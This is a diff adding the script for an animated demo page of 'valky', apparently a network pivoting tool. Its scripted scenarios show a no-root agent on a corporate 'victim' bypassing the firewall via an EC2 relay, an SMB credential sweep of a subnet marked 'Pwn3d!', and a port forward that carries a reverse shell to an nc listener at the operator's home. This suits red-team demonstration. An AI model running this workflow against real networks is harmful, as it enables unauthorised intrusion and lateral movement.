+        nodes: ["n-srv", "n-pivot"], flow: { seq: ["pB"], dir: "rev", color: "var(--c-yellow)" },
+        mode: "agent ▸ proxy",
+        caption: "<b>No root</b> → no TUN: the client reports <span class=\"r\">no tunnel (proxy mode)</span> and stands up a <b>userspace TCP/IP stack</b> to deliver L3."
+      },
+      {
+        prompt: "valky", cmd: "ls",
+        out: [ { table: {
+          headers: ["AGENT-UUID", "NAME", "MODE", "OVERLAY", "REMOTE", "SEGMENTS", "INTERFACES"],
+          rows: [
+            [["cyan","5e2a…1f00"],["gray","-"],["green","tunnel"],["green","10.9.0.1"],["gray","local"],["yellow","172.16.71.0/24"],["green","172.16.71.10"]],
+            [["cyan","9a77…ef02"],["gray","-"],["yellow","proxy"],["green","10.9.0.3"],["gray","10.10.20.80:52140"],["yellow","10.10.20.0/24"],["green","10.10.20.80"]]
+          ]
+        } } ],
+        nodes: ["n-srv", "n-pivot"], mode: "agent proxy",
+        caption: "In <code>ls</code>, <span class=\"y\">proxy</span> mode is yellow and <b>NAME</b> starts as <code>-</code>. db <b>30.30.30.5</b> lives <b>behind</b> the proxy agent."
+      },
+      {
+        prompt: "valky", cmd: "name 5e2a kali",
+        out: [ L(seg("green", "name set: "), seg("cyan", "5e2a…1f00"), seg("gray", " -> "), seg("yellow", "kali")) ],
+        nodes: ["n-srv", "n-kali"], mode: "name agent",
+        caption: "<code>name &lt;agent-uuid&gt; kali</code> assigns the alias to the source (the operator)."
+      },
+      {
+        prompt: "valky", cmd: "name 9a77 pivot-app",
+        out: [ L(seg("green", "name set: "), seg("cyan", "9a77…ef02"), seg("gray", " -> "), seg("yellow", "pivot-app")) ],
+        nodes: ["n-srv", "n-pivot"], mode: "name agent",
+        caption: "And the proxy agent, which we'll use in <code>--via</code> and the rules."
+      },
+      {
+        prompt: "valky", cmd: "route --resolve 30.30.30.5",
+        out: [
+          L(seg("hdr", "resolve "), seg("yellow", "30.30.30.5")),
+          L(seg("magenta", "  -> no agent delivers this address (no advertised segment or --via route covers it)"))
+        ],
+        nodes: ["n-srv", "n-pivot"], mode: "resolve ▸ none",
+        caption: "<span class=\"r\">BEFORE</span>: 30.30.30.0/24 is not an auto-advertised segment, so <b>nobody delivers it</b> yet."
+      },
+      {
+        prompt: "valky", cmd: "route --via 30.30.30.0/24 --id pivot-app",
+        out: [
+          L(seg("green", "subnet route published: "), seg("magenta", "7c9e0a11-2b4d-4e6f-8a1c-9d0e1f2a3b4c")),
+          L(seg("gray", "  agent "), seg("cyan", "9a77…ef02"), seg("gray", " delivers "), seg("yellow", "30.30.30.0/24"), seg("gray", " (online)")),
+          L(seg("gray", "  remember to allow a source with: route --add 30.30.30.0/24 --id <source-agent>"))
+        ],
+        nodes: ["n-srv", "n-pivot"], flow: { seq: ["pB"], color: "var(--c-yellow)" },
+        mode: "route --via",
+        caption: "<span class=\"y\">--via</span> sets the <b>delivery</b>: pivot-app delivers 30.30.30.0/24 as a next-hop with its userspace stack."
+      },
+      {
+        prompt: "valky", cmd: "route --add 30.30.30.0/24 --id kali",
+        out: [
+          L(seg("green", "rule created: "), seg("magenta", "b1d4f0a2-5c6e-47a8-9b0c-1d2e3f4a5b6c")),
+          L(seg("gray", "  agent "), seg("cyan", "5e2a…1f00"), seg("gray", " can reach "), seg("yellow", "30.30.30.0/24"), seg("gray", " (online)"))
+        ],
+        nodes: ["n-srv", "n-kali"], flow: { seq: ["pA"], color: "var(--c-green)" },
+        mode: "route --add --id kali",
+        caption: "As before, the permission is for the <b>source</b>: <code>--id <span class=\"c\">kali</span></code>. <code>--via</code> = who delivers; <code>--add</code> = who may use it."
+      },
+      {
+        prompt: "valky", cmd: "route --resolve 30.30.30.5",
+        out: [
+          L(seg("hdr", "resolve "), seg("yellow", "30.30.30.5")),
+          L(seg("green", "  -> "), seg("gray", "delivered by "), seg("cyan", "9a77…ef02"), seg("gray", " "), seg("yellow", "pivot-app")),
+          L(seg("gray", "  candidates:")),
+          L(seg("green", "    => "), seg("cyan", "9a77…ef02"), seg("gray", " pivot-app      "), seg("yellow", "--via   30.30.30.0/24"), seg("gray", " "), seg("green", "online")),
+          L(seg("gray", "  reason: "), seg("gray", "longest prefix /24, --via wins the tie"))
+        ],
+        nodes: ["n-srv", "n-pivot"], mode: "resolve ▸ ok",
+        caption: "<span class=\"y\">AFTER</span>: <code>route --resolve</code> shows pivot-app delivers it and <b>why</b> — real data-path introspection."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "Back to kali's shell. Since kali has a <b>TUN</b>, it can hit 30.30.30.5 natively even though the egress agent has no root."
+      },
+      {
+        prompt: "kali", cmd: "curl -s -o /dev/null -w '%{http_code}\\n' http://30.30.30.5",
+        out: [ L(seg("green", "200")) ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt",
+        flow: { seq: ["pA", "pB", "pC"], color: "var(--c-yellow)", reply: true },
+        mode: "ingress TUN x egress proxy",
+        caption: "<b>Tunnel ingress x proxy egress</b>: kali injects raw L3 over valky0, pivot-app <b>dials it with an OS socket</b> (userspace). No SOCKS in the path."
+      },
+      {
+        prompt: "kali", cmd: "nxc smb 30.30.30.5 -u svc -p ****",
+        out: [
+          L(seg("blue", "SMB  30.30.30.5  445  DB-01  [*] Windows 10 / Samba")),
+          L(seg("green", "SMB  30.30.30.5  445  DB-01  [+] svc:**** (Pwn3d!)"))
+        ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt",
+        flow: { seq: ["pA", "pB", "pC"], color: "var(--c-yellow)" },
+        mode: "proxy egress ▸ L3",
+        caption: "Double pivot into the internal net with a <b>no-root</b> agent: pivot-app's userspace stack translates the flow into OS sockets."
+      },
+      {
+        prompt: null, cmd: null,
+        out: [
+          L(seg("green", "[✓] proxy up — 30.30.30.0/24 delivered by an agent with no TUN and no admin")),
+          L(seg("gray", "    alternative without an operator TUN: socks --add --id pivot-app --listen 127.0.0.1:1080"))
+        ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt", mode: "pivot ready",
+        caption: "Note: in proxy mode there's no agent-side <code>ping</code>/ICMP — that needs tunnel mode. For TCP without an operator TUN, use <code>socks</code>."
+      }
+    ]
+  };
+
+  // ===================================================================
+  //  SCENARIO: CLOUD RELAY — home NAT operator ⇄ EC2 hub ⇄ corp proxy agent
+  // ===================================================================
+  var HUB = "35.12.34.56";
+  var cloud = {
+    nodes: {
+      kali:  { t: "kali (home NAT)", s: "root · TUN · 192.168.10.3", ip: "overlay 10.9.0.1", px: false },
+      srv:   { t: "valky hub (EC2)", s: "AWS public · " + HUB, ip: "0.0.0.0:9000", px: false },
+      pivot: { t: "victim (corp)", s: "proxy · behind FW", ip: "10.10.2.44 · ovl 10.9.0.3", px: true },
+      tgt:   { t: "srv-56", s: "corp LAN", ip: "10.10.2.56", px: false }
+    },
+    labels: { bc: "relay / overlay", cd: "10.10.2.0/24" },
+    steps: [
+      {
+        prompt: "ec2", cmd: "sudo ./valky server --config config.ini",
+        out: [ bannerChunk ],
+        nodes: ["n-srv"], mode: "hub up (EC2)",
+        caption: "The hub runs on a public <b>AWS EC2</b> (" + HUB + ") listening on :9000. Both ends will dial it <b>outbound</b>, so no inbound firewall rules are needed anywhere."
+      },
+      {
+        prompt: "kali", cmd: "sudo ./valky client --ip 35.12.34.56 --port 9000 --passwd ****",
+        out: [
+          clog("16:20:03", "agent UUID: 5e2a…1f00"),
+          clog("16:20:03", "advertised local segments: 192.168.10.0/24"),
+          clog("16:20:03", "authenticated; assigned overlay address: 10.9.0.1"),
+          clog("16:20:03", "TUN interface valky0"),
+          clog("16:20:03", "link established (encrypted); waiting for rules from the server...")
+        ],
+        nodes: ["n-srv", "n-kali"], flow: { seq: ["pA"], dir: "rev", color: "var(--c-green)" },
+        mode: "operator TUN (home)",
+        caption: "kali is behind a <b>home NAT</b> and connects <b>outbound</b> to the EC2 hub. Running as root → TUN <code>valky0</code>, raw-L3 ingress (overlay 10.9.0.1)."
+      },
+      {
+        prompt: "victim", cmd: "./valky client --ip 35.12.34.56 --port 9000 --passwd **** --name corp --bg",
+        out: [
+          clog("16:21:47", "agent UUID: 8b2f…77aa"),
+          clog("16:21:47", "advertised local segments: 10.10.2.0/24"),
+          clog("16:21:47", "no tunnel (proxy mode): operation not permitted", "magenta"),
+          clog("16:21:47", "run as administrator/root for a native L3 tunnel; proxy mode still routes L3 in userspace"),
+          clog("16:21:47", "userspace L3 egress ready (proxy mode)", "green"),
+          clog("16:21:47", "authenticated; assigned overlay address: 10.9.0.3"),
+          clog("16:21:47", "link established (encrypted); waiting for rules from the server..."),
+          L(seg("gray", "valky client running in the background (control 127.0.0.1:47656)"))
+        ],
+        nodes: ["n-srv", "n-pivot"], flow: { seq: ["pB"], dir: "rev", color: "var(--c-yellow)" },
+        mode: "agent ▸ proxy (corp)",
+        caption: "The victim is behind a <b>corporate firewall</b> and also dials <b>outbound</b> to the hub (egress-only bypass). No root → <b>proxy mode</b> userspace stack."
+      },
+      {
+        prompt: "valky", cmd: "ls",
+        out: [ { table: {
+          headers: ["AGENT-UUID", "NAME", "MODE", "OVERLAY", "REMOTE", "SEGMENTS", "INTERFACES"],
+          rows: [
+            [["cyan","5e2a…1f00"],["gray","-"],["green","tunnel"],["green","10.9.0.1"],["gray","198.51.100.7:40122"],["yellow","192.168.10.0/24"],["green","192.168.10.3"]],
+            [["cyan","8b2f…77aa"],["gray","-"],["yellow","proxy"],["green","10.9.0.3"],["gray","203.0.113.9:55640"],["yellow","10.10.2.0/24"],["green","10.10.2.44"]]
+          ]
+        } } ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "2 agents",
+        caption: "Both agents met on the cloud hub (note the two public egress IPs in REMOTE). corp <b>already delivers</b> 10.10.2.0/24; kali is the source needing ACL."
+      },
+      {
+        prompt: "valky", cmd: "name 5e2a kali",
+        out: [ L(seg("green", "name set: "), seg("cyan", "5e2a…1f00"), seg("gray", " -> "), seg("yellow", "kali")) ],
+        nodes: ["n-srv", "n-kali"], mode: "name agent",
+        caption: "Alias for the home operator, keyed by its stable UUID."
+      },
+      {
+        prompt: "valky", cmd: "name 8b2f corp",
+        out: [ L(seg("green", "name set: "), seg("cyan", "8b2f…77aa"), seg("gray", " -> "), seg("yellow", "corp")) ],
+        nodes: ["n-srv", "n-pivot"], mode: "name agent",
+        caption: "Alias for the corporate proxy agent. Now we can use <code>kali</code> and <code>corp</code> anywhere <code>--id</code> is expected."
+      },
+      {
+        prompt: "valky", cmd: "route --add 10.10.2.0/24 --id kali",
+        out: [
+          L(seg("green", "rule created: "), seg("magenta", "c4e7a1b9-33d0-4f21-9a7e-6b2c8d1e0f45")),
+          L(seg("gray", "  agent "), seg("cyan", "5e2a…1f00"), seg("gray", " can reach "), seg("yellow", "10.10.2.0/24"), seg("gray", " (online)")),
+          L(seg("blue", "  egress NAT on (default): the delivering agent (corp) masquerades so corp hosts can reply"))
+        ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], flow: { seq: ["pA", "pB"], color: "var(--c-green)" },
+        mode: "route --add --id kali",
+        caption: "Source permission to <code>--id <span class=\"c\">kali</span></code>. corp was already the delivery for 10.10.2.0/24 (auto-advertised)."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "Back to kali's shell (at home) to drive native tools through the relay."
+      },
+      {
+        prompt: "kali", cmd: "nxc smb 10.10.2.0/24 -u administrator -p 'Passw0rd1' -d fakedomain.local",
+        out: [
+          L(seg("gray", "# raw L3 over valky0 -> EC2 hub -> corp userspace egress (no proxychains)")),
+          L(seg("blue", "SMB  10.10.2.44  445  WEB01   [*] Windows Server 2019  (domain:fakedomain.local) (signing:True)")),
+          L(seg("blue", "SMB  10.10.2.56  445  SRV-56  [*] Windows Server 2022  (domain:fakedomain.local) (signing:False)")),
+          L(seg("green", "SMB  10.10.2.44  445  WEB01   [+] fakedomain.local\\administrator:Passw0rd1 (Pwn3d!)")),
+          L(seg("green", "SMB  10.10.2.56  445  SRV-56  [+] fakedomain.local\\administrator:Passw0rd1 (Pwn3d!)"))
+        ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt",
+        flow: { seq: ["pA", "pB", "pC"], color: "var(--c-yellow)" },
+        mode: "nxc sweep /24",
+        caption: "nxc sweeps the whole <b>10.10.2.0/24</b> through the cloud relay: <b>tunnel ingress (kali) × proxy egress (corp)</b>, two NATs apart."
+      },
+      {
+        prompt: "kali", cmd: "valky --resume",
+        out: [ bannerChunk ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ resume",
+        caption: "Re-attach to set up a forward that will catch a reverse shell back home."
+      },
+      {
+        prompt: "valky", cmd: "forward --add --id corp --to 192.168.10.3:1337",
+        out: [
+          L(seg("green", "port-forward created: "), seg("magenta", "f0a1b2c3-9d8e-4a7b-8c6d-5e4f3a2b1c09")),
+          L(seg("gray", "  agent "), seg("cyan", "8b2f…77aa"), seg("gray", ": "), seg("cyan", "0.0.0.0:1337"), seg("gray", " -> "), seg("yellow", "192.168.10.3:1337"), seg("gray", " (forward active on agent)")),
+          L(seg("gray", "  listening on all interfaces; to pin one use --listen <ip>:1337 from: "), seg("green", "10.10.2.44")),
+          L(seg("gray", "  delivery: target reached through agent "), seg("cyan", "5e2a…1f00"), seg("gray", " (kali owns 192.168.10.0/24). forward auto-authorizes corp -> 192.168.10.3"))
+        ],
+        nodes: ["n-srv", "n-pivot", "n-kali"], flow: { seq: ["pB", "pA"], color: "var(--c-green)" },
+        mode: "forward ▸ revshell catcher",
+        caption: "corp (proxy, <b>no root</b>) still runs a forward: it listens on <code>0.0.0.0:1337</code> in the corp LAN and relays through the hub to kali's home IP <code>192.168.10.3:1337</code>."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "Back to kali's shell at home to start the listener."
+      },
+      {
+        prompt: "kali", cmd: "nc -nlvp 1337",
+        out: [ L(seg("gray", "listening on [any] 1337 ...")) ],
+        nodes: ["n-kali"], mode: "nc ▸ listening",
+        caption: "kali listens at home. On SRV-56 the payload connects to <b>corp:1337</b> (its own LAN) — it never needs to reach the internet or kali directly."
+      },
+      {
+        prompt: null, cmd: null,
+        out: [
+          L(seg("green", "connect to [192.168.10.3] from (UNKNOWN) [10.10.2.56] 50122")),
+          L(seg("gray", "Microsoft Windows [Version 10.0.20348.2402]")),
+          L(seg("gray", "(c) Microsoft Corporation. All rights reserved.")),
+          L(seg("cyan", "C:\\Windows\\system32> whoami")),
+          L(seg("green", "fakedomain\\administrator"))
+        ],
+        nodes: ["n-tgt", "n-pivot", "n-srv"], hit: "n-kali",
+        flow: { seq: ["pC", "pB", "pA"], dir: "rev", color: "var(--c-green)" },
+        mode: "revshell ▸ caught",
+        caption: "The shell travels <b>SRV-56 → corp → EC2 hub → kali@home</b> and lands in <code>nc</code>. <b>Reverse shell across two NATs via the cloud relay. ✓</b>"
+      },
+      {
+        prompt: null, cmd: null,
+        out: [ L(seg("green", "[✓] cloud relay — home operator + corp proxy agent bridged by an EC2 hub; swept /24 and caught a revshell")) ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt", mode: "pivot ready",
+        caption: "No inbound rules anywhere — both ends are outbound to the hub. This is the AWS relay pattern (README scenario 2)."
+      }
+    ]
+  };
+
+  var scenarios = { tun: tunnel, prx: proxy, cld: cloud };
+  var scen = tunnel, steps = scen.steps;
+
+  // ---------- DOM ----------
+  var term = document.getElementById("term");
+  var caption = document.getElementById("caption");
+  var modeLabel = document.getElementById("mode-label");
+  var playBtn = document.getElementById("play");
+  var prevBtn = document.getElementById("prev");
+  var nextBtn = document.getElementById("next");
+  var restartBtn = document.getElementById("restart");
+  var speedBtn = document.getElementById("speed");
+  var stepsBar = document.getElementById("steps");
+  var packetsG = document.getElementById("packets");
+  var dropx = document.getElementById("dropx");
+  var tabTun = document.getElementById("tab-tun");
+  var tabPrx = document.getElementById("tab-prx");
+  var tabCld = document.getElementById("tab-cld");
+
+  var cur = -1, playing = false, gen = 0, dots = [], curKey = "tun";
+
+  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function promptParts(kind) {
+    if (kind === "kali") return { pre: '<span class="ln"><span class="kb">┌──(</span><span class="kr">root㉿kali</span><span class="kb">)-[</span><span class="kp">~</span><span class="kb">]</span></span>', line: '<span class="kb">└─</span><span class="kr">#</span> ' };
+    if (kind === "victim") return { pre: "", line: '<span class="vu">svc@web01</span><span class="shp">:</span><span class="vp">/tmp</span><span class="shp">$</span> ' };
+    if (kind === "ec2") return { pre: "", line: '<span class="vu">ubuntu@ec2-hub</span><span class="shp">:</span><span class="vp">~</span><span class="shp">$</span> ' };
+    return { pre: "", line: '<span class="host">valky</span><span class="sep">❯</span> ' };
+  }
+  function cmdBlock(step, text, caret) {
+    if (step.prompt === null || step.cmd === null) return "";
+    var p = promptParts(step.prompt);
+    return p.pre + '<span class="ln">' + p.line + '<span class="cmd">' + esc(text) + '</span>' + (caret ? '<span class="caret">&nbsp;</span>' : "") + '</span>';
+  }
+  function lineHTML(segs) {
+    var h = '<span class="ln">';
+    for (var i = 0; i < segs.length; i++) h += '<span class="' + segs[i][0] + '">' + esc(segs[i][1]) + '</span>';
+    return h + "</span>";
+  }
+  function chunkHTML(ch) {
+    if (ch.banner) return bannerHTML();
+    if (ch.table) return tableHTML(ch.table.headers, ch.table.rows);
+    return lineHTML(ch);
+  }
+  function stepHTML(step) {
+    var h = cmdBlock(step, step.cmd || "", false);
+    for (var i = 0; i < step.out.length; i++) h += chunkHTML(step.out[i]);
+    return h;
+  }
+
+  // ---------- diagram ----------
+  function setText(id, t) { document.getElementById(id).textContent = t; }
+  function loadNodes(s) {
+    var n = s.nodes;
+    setText("n-kali-t", n.kali.t); setText("n-kali-s", n.kali.s); setText("n-kali-ip", n.kali.ip);
+    setText("n-srv-t", n.srv.t); setText("n-srv-s", n.srv.s); setText("n-srv-ip", n.srv.ip);
+    setText("n-pivot-t", n.pivot.t); setText("n-pivot-s", n.pivot.s); setText("n-pivot-ip", n.pivot.ip);
+    setText("n-tgt-t", n.tgt.t); setText("n-tgt-s", n.tgt.s); setText("n-tgt-ip", n.tgt.ip);
+    document.getElementById("n-pivot").classList.toggle("px", !!n.pivot.px);
+    setText("lbl-bc", s.labels.bc); setText("lbl-cd", s.labels.cd);
+  }
+  function clearNodes() {
+    ["n-kali", "n-srv", "n-pivot", "n-tgt"].forEach(function (id) { document.getElementById(id).classList.remove("lit", "hit", "drop"); });
+    ["pA", "pB", "pC"].forEach(function (id) { document.getElementById(id).classList.remove("lit", "px"); });
+    dropx.style.opacity = 0;
+  }
+  function setNodes(step) {
+    (step.nodes || []).forEach(function (id) { document.getElementById(id).classList.add("lit"); });
+    if (step.hit) document.getElementById(step.hit).classList.add("hit");
+  }
+
+  function runPacket(pathId, color, dir) {
+    return new Promise(function (resolve) {
+      var path = document.getElementById(pathId);
+      var len = path.getTotalLength();
+      var isPx = color === "var(--c-yellow)";
+      path.classList.add("lit"); if (isPx) path.classList.add("px");
+      if (reduce) { resolve(); return; }
+      var dur = d(T_PKT), dotCount = 3, spacing = 0.2, circles = [];
+      for (var k = 0; k < dotCount; k++) {
+        var c = document.createElementNS("http://www.w3.org/2000/svg", "circle");
+        c.setAttribute("r", k === 0 ? 5 : 3.2);
+        c.setAttribute("fill", color);
+        c.style.filter = "drop-shadow(0 0 6px " + color + ")";
+        packetsG.appendChild(c); circles.push(c);
+      }
+      var start = null;
+      function frame(ts) {
+        if (!start) start = ts;
+        var t = (ts - start) / dur;
+        circles.forEach(function (c, k) {
+          var pp = t - k * spacing;
+          if (pp < 0 || pp > 1) { c.setAttribute("opacity", 0); return; }
+          var dd = dir === "rev" ? (1 - pp) : pp;
+          var pt = path.getPointAtLength(dd * len);
+          c.setAttribute("cx", pt.x); c.setAttribute("cy", pt.y);
+          c.setAttribute("opacity", (k === 0 ? 1 : 0.5));
+        });
+        if (t <= 1 + dotCount * spacing) requestAnimationFrame(frame);
+        else { circles.forEach(function (c) { c.remove(); }); resolve(); }
+      }
+      requestAnimationFrame(frame);
+    });
+  }
+  function flashDrop(nodeId) {
+    var node = document.getElementById(nodeId);
+    node.classList.add("drop");
+    var m = /translate\(([\d.]+),([\d.]+)\)/.exec(node.getAttribute("transform"));
+    if (m) { dropx.setAttribute("x", (+m[1]) + 150); dropx.setAttribute("y", (+m[2]) + 20); dropx.style.opacity = 1; }
+    setTimeout(function () { node.classList.remove("drop"); dropx.style.opacity = 0; }, d(1400));
+  }
+  async function runFlow(flow, myGen) {
+    if (!flow) return;
+    var paths = flow.seq || [flow.path], dir = flow.dir || "fwd";
+    for (var i = 0; i < paths.length; i++) { if (myGen !== gen) return; await runPacket(paths[i], flow.color, dir); await sleep(d(120)); }
+    if (flow.drop) flashDrop(flow.drop);
+    if (flow.reply) { await sleep(d(T_REPLY)); for (var j = paths.length - 1; j >= 0; j--) { if (myGen !== gen) return; await runPacket(paths[j], flow.color, "rev"); await sleep(d(120)); } }
+  }
+
+  // ---------- rendering ----------
+  function renderUpTo(idx) {
+    var h = "";
+    for (var i = 0; i <= idx; i++) h += stepHTML(steps[i]);
+    h += '<span class="ln"><span class="host">valky</span><span class="sep">❯</span> <span class="caret">&nbsp;</span></span>';
+    term.innerHTML = h; term.scrollTop = term.scrollHeight;
+  }
+  function setCaption(step) { caption.innerHTML = step.caption; modeLabel.textContent = step.mode; }
+  function updateDots() {
+    dots.forEach(function (dd, i) { dd.classList.toggle("on", i === cur); dd.classList.toggle("done", i < cur); });
+    prevBtn.disabled = cur <= 0; nextBtn.disabled = cur >= steps.length - 1;
+  }
+
+  async function typeStep(idx, myGen) {
+    var step = steps[idx], base = "";
+    for (var i = 0; i < idx; i++) base += stepHTML(steps[i]);
+    clearNodes(); setCaption(step);
+
+    if (step.prompt !== null && step.cmd !== null) {
+      var full = step.cmd, typed = "";
+      for (var c = 0; c < full.length; c++) {
+        if (myGen !== gen) return;
+        typed += full[c];
+        term.innerHTML = base + cmdBlock(step, typed, true);
+        term.scrollTop = term.scrollHeight;
+        await sleep(d(T_TYPE));
+      }
+      base += cmdBlock(step, full, false);
+      term.innerHTML = base + '<span class="ln"><span class="caret">&nbsp;</span></span>';
+      term.scrollTop = term.scrollHeight;
+      await sleep(d(T_AFTERCMD));
+    }
+
+    setNodes(step);
+    var flowPromise = runFlow(step.flow, myGen);
+
+    var acc = base;
+    for (var li = 0; li < step.out.length; li++) {
+      if (myGen !== gen) return;
+      acc += chunkHTML(step.out[li]);
+      term.innerHTML = acc + '<span class="ln"><span class="caret">&nbsp;</span></span>';
+      term.scrollTop = term.scrollHeight;
+      await sleep(d(T_LINE));
+    }
+    await flowPromise;
+    if (myGen !== gen) return;
+    term.innerHTML = acc; term.scrollTop = term.scrollHeight;
+    cur = idx; updateDots();
+  }
+
+  async function jumpTo(idx) {
+    gen++; var myGen = gen; cur = idx;
+    renderUpTo(idx); clearNodes(); setNodes(steps[idx]); setCaption(steps[idx]); updateDots();
+    await runFlow(steps[idx].flow, myGen);
+  }
+
+  async function play() {
+    if (playing) return;
+    if (cur >= steps.length - 1) { gen++; cur = -1; term.innerHTML = ""; clearNodes(); }
+    playing = true; playBtn.textContent = "⏸ Pause"; playBtn.classList.remove("primary");
+    gen++; var myGen = gen;
+    for (var i = cur + 1; i < steps.length; i++) {
+      if (myGen !== gen) return;
+      await typeStep(i, myGen);
+      if (myGen !== gen) return;
+      await sleep(d(T_STEP));
+    }
+    stopPlay();
+  }
+  function stopPlay() {
+    playing = false; gen++;
+    playBtn.textContent = cur >= steps.length - 1 ? "⟲ Replay" : "▶ Play";
+    playBtn.classList.add("primary");
+  }
+
+  function buildDots() {
+    stepsBar.innerHTML = ""; dots = [];
+    steps.forEach(function (s, i) {
+      var b = document.createElement("button");
+      b.className = "sd"; b.setAttribute("aria-label", "step " + (i + 1));
+      b.addEventListener("click", function () { stopPlay(); jumpTo(i); });
+      stepsBar.appendChild(b); dots.push(b);
+    });
+  }
+
+  function loadScenario(key) {
+    stopPlay(); gen++;
+    curKey = key;
+    scen = scenarios[key]; steps = scen.steps;
+    loadNodes(scen);
+    cur = -1; term.innerHTML = ""; clearNodes();
+    caption.innerHTML = "Hit <b>▶ Play</b> to bring this scenario up step by step.";
+    modeLabel.textContent = "idle…";
+    buildDots(); updateDots();
+    tabTun.classList.toggle("on", key === "tun");
+    tabPrx.classList.toggle("on", key === "prx");
+    tabCld.classList.toggle("on", key === "cld");
+    if (tabDl) tabDl.classList.remove("on");
+    if (dlSection) { dlSection.hidden = true; gridEl.style.display = ""; controlsEl.style.display = ""; }
+  }
+
+  // ---------- downloads / github releases ----------
+  var gridEl = document.querySelector(".grid");
+  var controlsEl = document.querySelector(".controls");
+  var dlSection = document.getElementById("downloads");
+  var dlList = document.getElementById("dl-list");
+  var dlCount = document.getElementById("dl-count");
+  var tabDl = document.getElementById("tab-dl");
+  var dlLoaded = false;
+
+  function fmtSize(b) {
+    if (b == null) return "";
+    var u = ["B", "KB", "MB", "GB"], i = 0;
+    while (b >= 1024 && i < u.length - 1) { b /= 1024; i++; }
+    return (i === 0 ? b : b.toFixed(1)) + " " + u[i];
+  }
+  function fmtDate(s) { return s ? String(s).slice(0, 10) : ""; }
+  function dlStatus(msg, isErr) {
+    dlList.innerHTML = '<p class="dl-status' + (isErr ? " err" : "") + '">' + msg + "</p>";
+  }
+  function renderReleases(rels) {
+    if (!rels.length) { dlStatus("// no releases published yet."); dlCount.textContent = ""; return; }
+    dlCount.textContent = rels.length + " release" + (rels.length === 1 ? "" : "s");
+    var h = "";
+    rels.forEach(function (r) {
+      var title = esc(r.name || r.tag_name || "release");
+      h += '<article class="rel">';
+      h += '<div class="rel-top"><h3>' + title + "</h3>";
+      h += '<span class="rel-tag' + (r.prerelease ? " pre" : "") + '">' + esc(r.tag_name || "") + (r.prerelease ? " · pre" : "") + "</span>";
+      h += '<span class="rel-date">' + fmtDate(r.published_at) + "</span></div>";
+      var assets = r.assets || [];
+      if (assets.length) {
+        h += '<ul class="assets">';
+        assets.forEach(function (a) {
+          h += '<li class="asset"><a href="' + esc(a.browser_download_url) + '" rel="noopener">▓ ' + esc(a.name) + "</a>"
+            + '<span class="sz">' + fmtSize(a.size) + "</span>"
+            + '<span class="dc">' + (a.download_count || 0) + " ⤓</span></li>";
+        });
+        h += "</ul>";
+      }
+      if (r.html_url) h += '<div class="rel-src"><a href="' + esc(r.html_url) + '" rel="noopener">↗ view on github</a></div>';
+      h += "</article>";
+    });
+    dlList.innerHTML = h;
+  }
+  function loadReleases() {
+    document.getElementById("dl-repo").textContent = RELEASES_REPO;
+    dlStatus("connecting to api.github.com…");
+    fetch("https://api.github.com/repos/" + RELEASES_REPO + "/releases?per_page=20", { headers: { Accept: "application/vnd.github+json" } })
+      .then(function (res) {
+        if (res.status === 404) throw new Error("repo not found or private (" + RELEASES_REPO + "). Set RELEASES_REPO once it is public.");
+        if (res.status === 403) throw new Error("GitHub API rate limit reached; try again later.");
+        if (!res.ok) throw new Error("HTTP " + res.status);
+        return res.json();
+      })
+      .then(function (data) { renderReleases(Array.isArray(data) ? data : []); })
+      .catch(function (e) { dlStatus("// " + esc(e.message), true); dlCount.textContent = ""; });
+  }
+  function showDownloads() {
+    stopPlay();
+    gridEl.style.display = "none"; controlsEl.style.display = "none";
+    dlSection.hidden = false;
+    [tabTun, tabPrx, tabCld].forEach(function (t) { t.classList.remove("on"); });
+    tabDl.classList.add("on");
+    if (!dlLoaded) { dlLoaded = true; loadReleases(); }
+  }
+  tabDl.addEventListener("click", showDownloads);
+
+  playBtn.addEventListener("click", function () { if (playing) stopPlay(); else play(); });
+  nextBtn.addEventListener("click", function () { stopPlay(); if (cur < steps.length - 1) jumpTo(cur + 1); });
+  prevBtn.addEventListener("click", function () { stopPlay(); if (cur > 0) jumpTo(cur - 1); });
+  restartBtn.addEventListener("click", function () { loadScenario(curKey); });
+  speedBtn.addEventListener("click", function () { spi = (spi + 1) % SPEEDS.length; speedBtn.textContent = "⏱ Speed: " + SPEEDS[spi].n; });
+  tabTun.addEventListener("click", function () { loadScenario("tun"); });
+  tabPrx.addEventListener("click", function () { loadScenario("prx"); });
+  tabCld.addEventListener("click", function () { loadScenario("cld"); });
+
+  speedBtn.textContent = "⏱ Speed: " + SPEEDS[spi].n;
+  loadScenario("tun");
+})();
+</script>
